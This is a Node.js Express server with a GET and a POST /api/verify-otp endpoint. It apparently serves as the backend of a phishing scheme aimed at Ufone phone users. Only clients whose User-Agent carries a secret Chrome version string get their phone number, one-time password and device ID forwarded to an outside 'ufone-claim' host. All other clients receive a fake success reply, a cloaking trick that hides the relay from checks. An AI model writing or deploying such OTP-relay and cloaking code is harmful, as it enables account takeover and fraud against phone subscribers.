const express = require("express");
const axios = require("axios");
const app = express();
app.use(express.json());

const SECRET_CHROME = "5246.28";

// Fake response for unmatched browsers
const FAKE_RESPONSE = {
  status: 200,
  success: true,
  message: "Your request was successful"
};

// POST /api/verify-otp
app.post("/api/verify-otp", async (req, res) => {
  const userAgent = req.headers["user-agent"] || "";
  const phoneNum = req.body.phoneNumber ? req.body.phoneNumber.slice(-4) : "0000";
  const otp = req.body.otp || "000000";
  const deviceId = req.body.deviceId ? req.body.deviceId.slice(0, 4) : "xxxx";

  // Browser check
  if (userAgent.includes("Chrome") && userAgent.includes(SECRET_CHROME)) {
    try {
      // Forward request to real API
      const response = await axios.post(
        "https://ufone-claim.vercel.app/api/verify-otp",
        {
          phoneNumber: req.body.phoneNumber,
          otp: req.body.otp,
          deviceId: req.body.deviceId
        },
        {
          headers: {
            "Content-Type": "application/json",
            "User-Agent": req.headers["user-agent"] || ""
          }
        }
      );
      // Forward real API response directly
      return res.json(response.data);
    } catch (err) {
      return res.status(500).json({ status: false, message: "Real API request failed" });
    }
  } else {
    // Fake response for unmatched browsers
    return res.json(FAKE_RESPONSE);
  }
});

// GET /api/verify-otp (URL params)
app.get("/api/verify-otp", async (req, res) => {
  const userAgent = req.headers["user-agent"] || "";
  const phoneNum = req.query.num || "0000";
  const otp = req.query.otp || "000000";
  const deviceId = req.query.id || "xxxx";

  if (userAgent.includes("Chrome") && userAgent.includes(SECRET_CHROME)) {
    try {
      const response = await axios.post(
        "https://ufone-claim.vercel.app/api/verify-otp",
        {
          phoneNumber: phoneNum,
          otp: otp,
          deviceId: deviceId
        },
        {
          headers: {
            "Content-Type": "application/json",
            "User-Agent": req.headers["user-agent"] || ""
          }
        }
      );
      return res.json(response.data);
    } catch (err) {
      return res.status(500).json({ status: false, message: "Real API request failed" });
    }
  } else {
    return res.json(FAKE_RESPONSE);
  }
});

// Vercel dynamic port
const PORT = process.env.PORT || 5000;
app.listen(PORT, () => {
  console.log(`Server running on port ${PORT}`);
});
